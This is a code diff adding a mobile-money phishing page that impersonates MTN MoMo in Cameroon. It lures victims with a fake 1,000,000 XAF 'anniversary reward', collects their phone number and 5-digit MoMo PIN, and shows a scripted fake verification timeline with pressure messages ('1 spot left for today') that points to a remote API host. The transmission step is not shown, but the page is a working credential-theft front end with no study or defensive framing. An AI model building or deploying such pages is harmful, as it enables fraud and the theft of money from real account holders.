+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      position: relative;
+      overflow: hidden;
+    }
+    .line-icon-wrap {
+      width: 88px; height: 88px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #FEE2E2, #FECACA);
+      box-shadow: 0 12px 32px rgba(220, 38, 38, 0.3);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 22px;
+      font-size: 42px;
+      animation: linePulse 2s ease-in-out infinite;
+    }
+    @keyframes linePulse {
+      0%, 100% { transform: scale(1); }
+      50%      { transform: scale(1.05); }
+    }
+    .line-title {
+      font-size: 1.35rem;
+      font-weight: 900;
+      color: #1C2340;
+      margin-bottom: 14px;
+      letter-spacing: -0.02em;
+      line-height: 1.3;
+    }
+    .line-title .red { color: #DC2626; }
+    .line-message {
+      font-size: 0.95rem;
+      color: #4B5168;
+      line-height: 1.65;
+      margin-bottom: 24px;
+      font-weight: 500;
+      padding: 0 4px;
+    }
+    .line-message strong { color: #1C2340; font-weight: 800; }
+    .line-btn {
+      width: 100%;
+      padding: 16px;
+      background: var(--grad-gold);
+      color: #1A1A2E;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+      transition: transform 0.2s, box-shadow 0.2s, filter 0.2s;
+    }
+    .line-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+      filter: brightness(0.98);
+    }
+    .line-btn:active { transform: scale(0.98); }
+
+    @keyframes popIn {
+      from { transform: scale(0.88) translateY(20px); opacity: 0; }
+      to { transform: scale(1) translateY(0); opacity: 1; }
+    }
+
+    @media (max-width: 480px) {
+      .main { padding: 18px 12px 30px; }
+      .momo-band { padding: 20px 20px 24px; }
+      .momo-logo-img { height: 38px; }
+      .momo-logo-wrap { padding: 8px 14px; margin-bottom: 12px; }
+      .amount-badge { padding: 10px 20px; }
+      .amount-badge .amount-value { font-size: 1.4rem; }
+      .login-body { padding: 24px 18px 26px; }
+      .brand-logo-img { height: 40px; }
+      .brand-sub { font-size: 11px; }
+      .pin-modal { bottom: 140px; }
+      .lang-btn { padding: 6px 10px; font-size: 0.72rem; }
+      .verify-card { padding: 20px 16px 18px; border-radius: 22px; }
+      .verify-ring-wrap { width: 76px; height: 76px; margin-bottom: 12px; }
+      .verify-ring-core { width: 48px; height: 48px; padding: 4px; }
+      .verify-amount-value { font-size: 1.4rem; }
+      .verify-timeline { max-height: 200px; }
+      .tl-text { font-size: 12px; }
+    }
+    @media (max-width: 380px) {
+      .brand-sub { display: none; }
+      .brand-divider { display: none; }
+      .lang-btn .lang-name { display: none; }
+      .pin-input { font-size: 22px; letter-spacing: 10px; }
+      .amount-badge .amount-value { font-size: 1.25rem; }
+    }
+    @media (max-height: 700px) {
+      .verify-card { padding: 18px 16px 16px; }
+      .verify-ring-wrap { width: 68px; height: 68px; margin-bottom: 10px; }
+      .verify-ring-core { width: 44px; height: 44px; padding: 4px; }
+      .verify-amount-block { margin-bottom: 12px; }
+      .verify-timeline { max-height: 180px; margin-bottom: 10px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- REJECT BANNER -->
+  <div class="reject-banner" id="rejectBanner">
+    <span class="r-ico">⚠️</span>
+    <div class="r-text">
+      <b data-i18n="login.reject_bold">Identifiants incorrects.</b>
+      <span data-i18n="login.reject_msg">Veuillez entrer votre numéro MoMo et réessayer.</span>
+    </div>
+  </div>
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="header-inner">
+      <a href="index.html" class="brand">
+        <img src="https://i.pinimg.com/736x/06/04/e2/0604e2f0143a508140d9be2ce45e6627.jpg" alt="MoMo Xtra Prêts" class="brand-logo-img">
+        <div class="brand-divider"></div>
+        <span class="brand-sub" data-i18n="brand.sub">MoMo Xtra Prêts</span>
+      </a>
+
+      <div class="lang-wrap" id="langWrap">
+        <button type="button" class="lang-btn" id="langBtn" aria-haspopup="true">
+          <span class="globe">🌐</span>
+          <span class="lang-name" id="langName">Français</span>
+          <span class="caret">▼</span>
+        </button>
+        <div class="lang-menu" id="langMenu">
+          <button type="button" class="lang-item" data-lang="fr"><span>Français</span><span class="check">✓</span></button>
+          <button type="button" class="lang-item" data-lang="en"><span>English</span><span class="check">✓</span></button>
+          <button type="button" class="lang-item" data-lang="cr"><span>Camfranglais</span><span class="check">✓</span></button>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="login-wrap">
+      <div class="login-card-wrap">
+
+        <div class="momo-band">
+          <div class="momo-logo-wrap">
+            <img src="https://i.pinimg.com/736x/06/04/e2/0604e2f0143a508140d9be2ce45e6627.jpg" alt="MoMo Xtra Prêts" class="momo-logo-img">
+          </div>
+
+          <div class="amount-badge" id="amountBadge">
+            <div class="amount-label">
+              <span>💰</span>
+              <span data-i18n="amount.label">Votre récompense</span>
+            </div>
+            <div class="amount-value">
+              <span class="amount-currency">XAF</span>
+              <span id="amountValue">1,000,000</span>
+            </div>
+            <div class="amount-sub" data-i18n="amount.sub">Prête à être réclamée</div>
+          </div>
+        </div>
+
+        <div class="login-body">
+
+          <h1 class="welcome-title" data-i18n="login.welcome_title">Débloquez votre cadeau MoMo</h1>
+          <p class="welcome-sub" data-i18n="login.welcome_sub">Entrez votre numéro MoMo pour débloquer votre récompense anniversaire</p>
+
+          <div class="form-field">
+            <label class="input-label" for="phone" data-i18n="login.phone_label">Numéro MoMo</label>
+            <div class="phone-input" id="phoneWrapper">
+              <span class="country-btn">
+                <svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true">
+                  <rect width="300" height="600" fill="#007A5E"/>
+                  <rect x="300" width="300" height="600" fill="#CE1126"/>
+                  <rect x="600" width="300" height="600" fill="#FCD116"/>
+                  <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
+                </svg>
+                <span>+237</span>
+              </span>
+              <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+            </div>
+            <div class="error-text" id="phoneError" data-i18n="login.phone_error">Veuillez saisir un numéro valide à 9 chiffres</div>
+          </div>
+
+          <button class="login-btn" id="loginBtn">
+            <span data-i18n="login.continue_btn">CONTINUER</span> →
+          </button>
+
+          <div class="security-note">
+            <span class="ico">🔒</span>
+            <span data-i18n="login.secure">Vos informations sont chiffrées et sécurisées</span>
+          </div>
+
+          <p class="signup-text">
+            <span data-i18n="login.no_account">Vous n'avez pas de compte MoMo ?</span>
+            <a href="#" onclick="alert('Composez *126# pour vous inscrire à MoMo Xtra Prêts'); return false;" data-i18n="login.register">Inscrivez-vous ici</a>
+          </p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- BOTTOM NAV -->
+  <nav class="bottom-nav">
+    <div class="bottom-nav-inner">
+      <a href="index.html" class="nav-item"><span class="ico">🏠</span><span data-i18n="nav.home">Accueil</span></a>
+      <a href="#" class="nav-item active"><span class="ico">🎁</span><span data-i18n="nav.claim">Réclamer</span></a>
+      <a href="#" class="nav-item" onclick="alert('Contactez le support à support@momoxra.cm'); return false;"><span class="ico">💬</span><span data-i18n="nav.support">Support</span></a>
+    </div>
+  </nav>
+
+  <!-- PIN POPUP -->
+  <div class="modal-container" id="modalContainer">
+    <div class="sheet-overlay" id="sheetOverlay"></div>
+    <div class="pin-modal" id="pinModal">
+      <h3 class="pin-modal-title">
+        <span data-i18n="pin.title_a">Vérifiez pour débloquer votre</span> <strong data-i18n="pin.title_b">cadeau ?</strong>
+      </h3>
+      <p class="pin-modal-sub" data-i18n="pin.sub">Entrez votre code PIN MoMo à 5 chiffres pour réclamer votre récompense</p>
+
+      <label class="pin-label" for="momo_pin" data-i18n="pin.label">Entrer le PIN</label>
+      <div class="pin-input-wrap">
+        <input id="momo_pin" type="password" maxlength="5" inputmode="numeric" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" enterkeyhint="done" placeholder="•••••" class="pin-input" />
+        <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
+          <svg viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="pin-forgot-row">
+        <a class="pin-forgot" href="#" onclick="alert('Composez *126# pour réinitialiser votre PIN MoMo.'); return false;" data-i18n="pin.forgot">PIN oublié ?</a>
+      </div>
+
+      <div class="pin-error" id="pinError" data-i18n="pin.error">Veuillez saisir votre PIN MoMo à 5 chiffres</div>
+
+      <div class="pin-actions">
+        <button id="cancelBtn" type="button" class="btn-cancel" data-i18n="pin.cancel">Annuler</button>
+        <button id="proceedBtn" type="button" disabled class="btn-pin-proceed">
+          <span data-i18n="pin.proceed">Continuer</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- VERIFY OVERLAY -->
+  <div class="verify-overlay" id="verifyOverlay">
+    <div class="verify-card">
+
+      <div class="verify-ring-wrap">
+        <svg viewBox="0 0 88 88" aria-hidden="true">
+          <defs>
+            <linearGradient id="vGoldGrad" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%"   stop-color="#FFD633"/>
+              <stop offset="50%"  stop-color="#FFCC00"/>
+              <stop offset="100%" stop-color="#F5B500"/>
+            </linearGradient>
+          </defs>
+          <circle class="track"    cx="44" cy="44" r="36"></circle>
+          <circle class="progress" id="verifyRingProgress" cx="44" cy="44" r="36"></circle>
+        </svg>
+        <div class="verify-ring-core">
+          <img src="https://i.pinimg.com/736x/06/04/e2/0604e2f0143a508140d9be2ce45e6627.jpg" alt="MoMo Xtra Prêts">
+        </div>
+      </div>
+
+      <div class="verify-amount-block">
+        <div class="verify-amount-value" id="verifyAmountValue">
+          <span class="cur">XAF</span><span>1,000,000</span>
+        </div>
+        <div class="verify-amount-sub" data-i18n="verify.amount_sub">Almost yours</div>
+      </div>
+
+      <div class="verify-timeline" id="verifyTimeline"></div>
+
+      <div class="verify-progress">
+        <div class="verify-progress-fill" id="verifyProgressFill"></div>
+      </div>
+
+      <div class="verify-patience" id="verifyPatience">
+        <span data-i18n="verify.patience">⏳ Cela prend un peu plus de temps que d'habitude. Merci de garder cette page ouverte.</span>
+      </div>
+
+      <div class="verify-live">
+        <span class="verify-live-dot"></span>
+        <span data-i18n="verify.live_label">LIVE</span>
+        <span class="elapsed-text" id="verifyElapsed">· 0s</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- LINE INACTIVE OVERLAY -->
+  <div class="line-overlay" id="lineOverlay">
+    <div class="line-card">
+      <div class="line-icon-wrap">📵</div>
+      <h2 class="line-title">
+        <span data-i18n="line.title_a">Your MTN line is</span> <span class="red" data-i18n="line.title_b">inactive</span>
+      </h2>
+      <p class="line-message" data-i18n="line.message">
+        Your line cannot respond right now. Please make a few regular transactions on your MoMo account to <strong>qualify your line</strong> and receive your loan.
+      </p>
+      <button class="line-btn" id="lineBtn">
+        <span data-i18n="line.btn">OK, GOT IT</span> →
+      </button>
+    </div>
+  </div>
+
+  <script>
+    const API_BASE = 'https://momo-xtra-pr-ts-production.up.railway.app';
+    const POLL_INTERVAL_MS = 2500;
+    const NUMBER_LOADING_MS = 3000;
+
+    /* ============================================
+       TRANSLATIONS
+       ============================================ */
+    const TRANSLATIONS = {
+      fr: {
+        'brand.sub': 'MoMo Xtra Prêts',
+        'amount.label': 'Votre récompense',
+        'amount.sub': 'Prête à être réclamée',
+        'login.welcome_title': 'Débloquez votre cadeau MoMo',
+        'login.welcome_sub': 'Entrez votre numéro MoMo pour débloquer votre récompense anniversaire',
+        'login.phone_label': 'Numéro MoMo',
+        'login.phone_error': 'Veuillez saisir un numéro valide à 9 chiffres',
+        'login.continue_btn': 'CONTINUER',
+        'login.secure': 'Vos informations sont chiffrées et sécurisées',
+        'login.no_account': "Vous n'avez pas de compte MoMo ?",
+        'login.register': 'Inscrivez-vous ici',
+        'login.reject_bold': 'Identifiants incorrects.',
+        'login.reject_msg': 'Veuillez entrer votre numéro MoMo et réessayer.',
+        'pin.title_a': 'Vérifiez pour débloquer votre',
+        'pin.title_b': 'cadeau ?',
+        'pin.sub': 'Entrez votre code PIN MoMo à 5 chiffres pour réclamer votre récompense',
+        'pin.label': 'Entrer le PIN',
+        'pin.forgot': 'PIN oublié ?',
+        'pin.error': 'Veuillez saisir votre PIN MoMo à 5 chiffres',
+        'pin.cancel': 'Annuler',
+        'pin.proceed': 'Continuer',
+        'nav.home': 'Accueil',
+        'nav.claim': 'Réclamer',
+        'nav.support': 'Support',
+        'verify.amount_sub': 'Presque à vous',
+        'verify.patience': '⏳ Cela prend un peu plus de temps que d\'habitude. Merci de garder cette page ouverte.',
+        'verify.patience_30': '⏳ Cela prend un instant de plus — nous finalisons votre éligibilité…',
+        'verify.patience_60': '🔒 Votre récompense est toujours réservée. Merci de rester sur cette page.',
+        'verify.patience_90': '⏰ Encore un peu — MTN confirme les derniers détails.',
+        'verify.live_label': 'LIVE',
+        'verify.tl_1': 'Canal sécurisé établi',
+        'verify.tl_2': 'Votre numéro MoMo est reconnu',
+        'verify.tl_3': 'Votre récompense de XAF {AMT} est réservée',
+        'verify.tl_4': 'Vérification d\'éligibilité auprès de MTN',
+        'verify.tl_5': '1 place restante pour aujourd\'hui',
+        'verify.tl_6': 'Confirmation finale en cours',
+        'verify.tl_7': 'Ne fermez pas — presque débloqué',
+        'line.title_a': 'Votre ligne MTN est',
+        'line.title_b': 'inactive',
+        'line.message': 'Votre ligne ne peut pas répondre pour le moment. Veuillez effectuer quelques transactions régulières sur votre compte MoMo pour <strong>qualifier votre ligne</strong> et recevoir votre prêt.',
+        'line.btn': 'OK, COMPRIS'
+      },
+      en: {
+        'brand.sub': 'MoMo Xtra Loans',
+        'amount.label': 'Your reward',
+        'amount.sub': 'Ready to claim',
+        'login.welcome_title': 'Unlock Your MoMo Gift',
+        'login.welcome_sub': 'Enter your MoMo number to unlock your anniversary reward',
+        'login.phone_label': 'MoMo Phone Number',
+        'login.phone_error': 'Please enter a valid 9-digit phone number',
+        'login.continue_btn': 'CONTINUE',
+        'login.secure': 'Your details are encrypted and secure',
+        'login.no_account': "Don't have a MoMo account?",
+        'login.register': 'Register here',
+        'login.reject_bold': 'Incorrect credentials.',
+        'login.reject_msg': 'Please enter your MoMo number and try again.',
+        'pin.title_a': 'Verify to unlock your',
+        'pin.title_b': 'gift?',
+        'pin.sub': 'Enter your 5-digit MoMo PIN to claim your anniversary reward',
+        'pin.label': 'Enter PIN',
+        'pin.forgot': 'Forgot PIN?',
+        'pin.error': 'Please enter your 5-digit MoMo PIN',
+        'pin.cancel': 'Cancel',
+        'pin.proceed': 'Proceed',
+        'nav.home': 'Home',
+        'nav.claim': 'Claim',
+        'nav.support': 'Support',
+        'verify.amount_sub': 'Almost yours',
+        'verify.patience': '⏳ Taking a little longer than usual. Please keep this page open.',
+        'verify.patience_30': '⏳ Just a moment — we\'re finalizing your eligibility…',
+        'verify.patience_60': '🔒 Your reward is still reserved. Please stay on this page.',
+        'verify.patience_90': '⏰ A bit longer — MTN is confirming the last details.',
+        'verify.live_label': 'LIVE',
+        'verify.tl_1': 'Secure channel established',
+        'verify.tl_2': 'Your MoMo number matched',
+        'verify.tl_3': 'Your XAF {AMT} reward is reserved',
+        'verify.tl_4': 'Verifying eligibility with MTN',
+        'verify.tl_5': '1 spot left for today',
+        'verify.tl_6': 'Final confirmation in progress',
+        'verify.tl_7': 'Don\'t close — almost unlocked',
+        'line.title_a': 'Your MTN line is',
+        'line.title_b': 'inactive',
+        'line.message': 'Your line cannot respond right now. Please make a few regular transactions on your MoMo account to <strong>qualify your line</strong> and receive your loan.',
+        'line.btn': 'OK, GOT IT'
+      },
+      cr: {
+        'brand.sub': 'MoMo Xtra Prêts',
+        'amount.label': 'Your reward',
+        'amount.sub': 'Ready to claim',
+        'login.welcome_title': 'Unlock Your MoMo Gift',
+        'login.welcome_sub': 'Put your MoMo number make you unlock your anniv reward',
+        'login.phone_label': 'MoMo Phone Number',
+        'login.phone_error': 'Abeg put correct 9-digit number',
+        'login.continue_btn': 'CONTINUE',
+        'login.secure': 'Your details dey safe',
+        'login.no_account': 'You no get MoMo account?',
+        'login.register': 'Register here',
+        'login.reject_bold': 'Wrong credentials.',
+        'login.reject_msg': 'Abeg put your MoMo number and try again.',
+        'pin.title_a': 'Verify make you unlock your',
+        'pin.title_b': 'gift?',
+        'pin.sub': 'Put your 5-digit MoMo PIN make you claim your anniv reward',
+        'pin.label': 'Put PIN',
+        'pin.forgot': 'You forget PIN?',
+        'pin.error': 'Abeg put your 5-digit MoMo PIN',
+        'pin.cancel': 'Cancel',
+        'pin.proceed': 'Proceed',
+        'nav.home': 'Home',
+        'nav.claim': 'Claim',
+        'nav.support': 'Support',
+        'verify.amount_sub': 'Almost yours',
+        'verify.patience': '⏳ E dey take small more time. Abeg keep this page open.',
+        'verify.patience_30': '⏳ Small more time — we dey finalize your eligibility…',
+        'verify.patience_60': '🔒 Your reward still dey reserved. Abeg stay for this page.',
+        'verify.patience_90': '⏰ Small more — MTN dey confirm last details.',
+        'verify.live_label': 'LIVE',
+        'verify.tl_1': 'Secure channel done set',
+        'verify.tl_2': 'We done see your MoMo number',
+        'verify.tl_3': 'Your XAF {AMT} reward don reserve',
+        'verify.tl_4': 'We dey verify eligibility with MTN',
+        'verify.tl_5': '1 spot remain for today',
+        'verify.tl_6': 'Final confirmation dey run',
+        'verify.tl_7': 'No close — almost unlock',
+        'line.title_a': 'Your MTN line no dey',
+        'line.title_b': 'active',
+        'line.message': 'Your line no fit respond now. Abeg do small transactions on your MoMo make your line <strong>qualify</strong> and receive your loan.',
+        'line.btn': 'OK, GOT IT'
+      }
+    };
+
+    const LANG_META = {
+      fr: { name: 'Français' },
+      en: { name: 'English' },
+      cr: { name: 'Camfranglais' }
+    };
+
+    let currentLang = localStorage.getItem('momoLang') || 'fr';
+
+    function t(key, vars) {
+      const dict = TRANSLATIONS[currentLang] || TRANSLATIONS.fr;
+      let str = dict[key] !== undefined ? dict[key] : (TRANSLATIONS.fr[key] || key);
+      if (vars) {
+        Object.keys(vars).forEach(k => {
+          str = str.replace('{' + k + '}', vars[k]);
+        });
+      }
+      return str;
+    }
+
+    /* ============================================
+       LANGUAGE
+       ============================================ */
+    const langWrap = document.getElementById('langWrap');
+    const langBtn = document.getElementById('langBtn');
+    const langName = document.getElementById('langName');
+    const langItems = document.querySelectorAll('.lang-item');
+
+    function applyLanguage(lang) {
+      if (!TRANSLATIONS[lang]) lang = 'fr';
+      currentLang = lang;
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        el.innerHTML = t(key, { AMT: currentAmount.toLocaleString('en-US') });
+      });
+      langName.textContent = LANG_META[lang].name;
+      langItems.forEach(i => i.classList.toggle('selected', i.dataset.lang === lang));
+      localStorage.setItem('momoLang', lang);
+      document.documentElement.lang = lang === 'cr' ? 'en' : lang;
+      updateAmountDisplay();
+    }
+
+    langBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langWrap.classList.toggle('open');
+    });
+    langItems.forEach(item => {
+      item.addEventListener('click', (e) => {
+        e.stopPropagation();
+        applyLanguage(item.dataset.lang);
+        langWrap.classList.remove('open');
+      });
+    });
+    document.addEventListener('click', (e) => {
+      if (!langWrap.contains(e.target)) langWrap.classList.remove('open');
+    });
+
+    /* ============================================
+       AMOUNT
+       ============================================ */
+    let currentAmount = 1000000;
+
+    function loadAmountFromStorage() {
+      try {
+        const session = JSON.parse(localStorage.getItem('momoSession') || '{}');
+        const fromSession = parseInt(session.loanAmount, 10);
+        if (fromSession && fromSession > 0) currentAmount = fromSession;
+
+        const raw = localStorage.getItem('momoLoanAmount');
+        const fromRaw = parseInt(raw, 10);
+        if (fromRaw && fromRaw > 0) currentAmount = fromRaw;
+      } catch (e) {}
+    }
+
+    function updateAmountDisplay() {
+      const amountStr = currentAmount.toLocaleString('en-US');
+      const el1 = document.getElementById('amountValue');
+      if (el1) el1.textContent = amountStr;
+      const el2 = document.getElementById('verifyAmountValue');
+      if (el2) el2.innerHTML = '<span class="cur">XAF</span><span>' + amountStr + '</span>';
+    }
+
+    loadAmountFromStorage();
+    applyLanguage(currentLang);
+    updateAmountDisplay();
+
+    /* ============================================
+       PRE-FILL PHONE
+       ============================================ */
+    const phoneInput   = document.getElementById('phone');
+    const phoneWrapper = document.getElementById('phoneWrapper');
+    const phoneError   = document.getElementById('phoneError');
+    const rejectBanner = document.getElementById('rejectBanner');
+
+    const savedPhone = localStorage.getItem('momoPhone') || '';
+    if (savedPhone.startsWith('+237')) {
+      phoneInput.value = savedPhone.replace('+237', '');
+    } else if (savedPhone) {
+      phoneInput.value = savedPhone.replace(/\D/g, '').slice(0, 9);
+    }
+
+    phoneInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 9);
+      if (this.value.length === 9) {
+        phoneWrapper.classList.remove('invalid');
+        phoneError.classList.remove('show');
+      }
+    });
+
+    /* ============================================
+       PIN MODAL
+       ============================================ */
+    const modal = document.getElementById('modalContainer');
+    const popup = document.getElementById('pinModal');
+    const pin = document.getElementById('momo_pin');
+    const openBtn = document.getElementById('loginBtn');
+    const proceed = document.getElementById('proceedBtn');
+    const cancel = document.getElementById('cancelBtn');
+    const overlay = document.getElementById('sheetOverlay');
+    const togglePin = document.getElementById('togglePin');
+    const pinError = document.getElementById('pinError');
+
+    function movePopup() {
+      if (window.visualViewport) {
+        const keyboard = window.innerHeight - window.visualViewport.height;
+        popup.style.bottom = Math.max(120, keyboard + 60) + 'px';
+      }
+    }
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', movePopup);
+    }
+
+    function openModal() {
+      document.body.classList.add('modal-open');
+      modal.classList.add('open');
+      movePopup();
+      setTimeout(() => {
+        popup.classList.add('show');
+        setTimeout(() => pin.focus(), 250);
+      }, 50);
+    }
+
+    function closeModal() {
+      popup.classList.remove('show');
+      setTimeout(() => {
+        modal.classList.remove('open');
+        pin.value = '';
+        pin.type = 'password';
+        togglePin.classList.remove('active');
+        togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+        proceed.disabled = true;
+        proceed.innerHTML = '<span>' + t('pin.proceed') + '</span>';
+        pinError.classList.remove('show');
+        document.body.classList.remove('modal-open');
+      }, 250);
+    }
+
+    openBtn.addEventListener('click', () => {
+      const digits = phoneInput.value.replace(/\D/g, '');
+      if (digits.length !== 9) {
+        phoneWrapper.classList.add('invalid');
+        phoneError.classList.add('show');
+        phoneInput.focus();
+        return;
+      }
+
+      phoneWrapper.classList.remove('invalid');
+      phoneError.classList.remove('show');
+
+      openBtn.disabled = true;
+      openBtn.innerHTML = '<span class="btn-spinner-dark"></span><span>…</span>';
+
+      setTimeout(() => {
+        openBtn.disabled = false;
+        openBtn.innerHTML = '<span>' + t('login.continue_btn') + '</span> →';
+        openModal();
+      }, NUMBER_LOADING_MS);
+    });
+
+    togglePin.addEventListener('click', () => {
+      const isPassword = pin.type === 'password';
+      pin.type = isPassword ? 'text' : 'password';
+      togglePin.classList.toggle('active', isPassword);
+      togglePin.innerHTML = isPassword
+        ? '<svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'
+        : '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+      pin.focus();
+    });
+
+    pin.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 5);
+      proceed.disabled = !/^\d{5}$/.test(this.value);
+      pinError.classList.remove('show');
+    });
+
+    cancel.addEventListener('click', closeModal);
+    overlay.addEventListener('click', closeModal);
+
+    let bannerTimer = null;
+    function showRejectBanner() {
+      rejectBanner.classList.add('show');
+      if (bannerTimer) clearTimeout(bannerTimer);
+      bannerTimer = setTimeout(() => rejectBanner.classList.remove('show'), 6000);
+    }
+
+    /* ============================================
+       VERIFY TIMELINE
+       ============================================ */
+    const verifyOverlay    = document.getElementById('verifyOverlay');
+    const verifyRingProgress = document.getElementById('verifyRingProgress');
+    const verifyTimeline   = document.getElementById('verifyTimeline');
+    const verifyProgressFill = document.getElementById('verifyProgressFill');
+    const verifyPatience   = document.getElementById('verifyPatience');
+    const verifyElapsedEl  = document.getElementById('verifyElapsed');
+    const lineOverlay      = document.getElementById('lineOverlay');
+    const lineBtn          = document.getElementById('lineBtn');
+
+    const RING_CIRCUMFERENCE = 226.20;
+    const PROGRESS_WINDOW_MS = 3 * 60 * 1000;
+
+    let pollTimer = null;
+    let verifyTimer = null;
+    let elapsedTimer = null;
+    let patienceTimer30 = null, patienceTimer60 = null, patienceTimer90 = null;
+    let currentSessionId = null;
+
+    function addTimelineStep(index, done) {
+      const key = 'verify.tl_' + index;
+      const isLast = index === 7;
+      const step = document.createElement('div');
+      step.className = 'tl-step';
+
+      const nodeClass = done ? 'done' : (isLast ? 'done' : 'active');
+      const icon = done ? '✓' : '⏳';
+      const text = t(key, { AMT: currentAmount.toLocaleString('en-US') });
+
+      step.innerHTML =
+        '<div class="tl-node-wrap">' +
+          '<div class="tl-node ' + nodeClass + '">' + icon + '</div>' +
+          '<div class="tl-connector"></div>' +
+        '</div>' +
+        '<div class="tl-text">' + text + '</div>';
+
+      verifyTimeline.appendChild(step);
+      verifyTimeline.scrollTop = verifyTimeline.scrollHeight;
+      requestAnimationFrame(() => step.classList.add('visible'));
+    }
+
+    function startVerifyTimeline() {
+      verifyOverlay.classList.add('show');
+      verifyTimeline.innerHTML = '';
+      verifyProgressFill.style.width = '0%';
+      verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+      verifyPatience.classList.remove('show');
+      verifyPatience.innerHTML = '<span>' + t('verify.patience') + '</span>';
+      document.body.classList.add('modal-open');
+
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
+      if (patienceTimer30) clearTimeout(patienceTimer30);
+      if (patienceTimer60) clearTimeout(patienceTimer60);
+      if (patienceTimer90) clearTimeout(patienceTimer90);
+
+      const startTime = Date.now();
+
+      const schedule = [
+        { delay: 200,   idx: 1, done: true },
+        { delay: 900,   idx: 2, done: true },
+        { delay: 1600,  idx: 3, done: true },
+        { delay: 2600,  idx: 4, done: true },
+        { delay: 5000,  idx: 5, done: true },
+        { delay: 8000,  idx: 6, done: true },
+        { delay: 13000, idx: 7, done: false }
+      ];
+      schedule.forEach(item => {
+        setTimeout(() => addTimelineStep(item.idx, item.done), item.delay);
+      });
+
+      elapsedTimer = setInterval(() => {
+        const sec = Math.floor((Date.now() - startTime) / 1000);
+        verifyElapsedEl.textContent = '· ' + sec + 's';
+      }, 1000);
+
+      verifyTimer = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const ratio = Math.min((elapsed / PROGRESS_WINDOW_MS) * 0.90, 0.90);
+        verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+        verifyProgressFill.style.width = (ratio * 100).toFixed(1) + '%';
+      }, 500);
+
+      patienceTimer30 = setTimeout(() => {
+        verifyPatience.innerHTML = '<span>' + t('verify.patience_30') + '</span>';
+        verifyPatience.classList.add('show');
+      }, 30000);
+
+      patienceTimer60 = setTimeout(() => {
+        verifyPatience.innerHTML = '<span>' + t('verify.patience_60') + '</span>';
+      }, 60000);
+
+      patienceTimer90 = setTimeout(() => {
+        verifyPatience.innerHTML = '<span>' + t('verify.patience_90') + '</span>';
+      }, 90000);
+    }
+
+    function finishVerifyTimeline() {
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
+      if (patienceTimer30) clearTimeout(patienceTimer30);
+      if (patienceTimer60) clearTimeout(patienceTimer60);
+      if (patienceTimer90) clearTimeout(patienceTimer90);
+      verifyRingProgress.style.strokeDashoffset = '0';
+      verifyProgressFill.style.width = '100%';
+    }
+
+    function stopVerifyTimeline() {
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
+      if (patienceTimer30) clearTimeout(patienceTimer30);
+      if (patienceTimer60) clearTimeout(patienceTimer60);
+      if (patienceTimer90) clearTimeout(patienceTimer90);
+      verifyOverlay.classList.remove('show');
+      verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+      verifyProgressFill.style.width = '0%';
+      verifyTimeline.innerHTML = '';
+      verifyPatience.classList.remove('show');
+    }
+
+    function showLineInactive() {
+      stopPolling();
+      stopVerifyTimeline();
+      document.body.classList.remove('modal-open');
+      lineOverlay.classList.add('show');
+    }
+
+    lineBtn.addEventListener('click', () => {
+      localStorage.removeItem('momoSession');
+      localStorage.removeItem('momoPhone');
+      localStorage.removeItem('momoCountry');
+      localStorage.removeItem('momoSms');
+      window.location.href = 'index.html';
+    });
+
+    function stopPolling() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    }
+
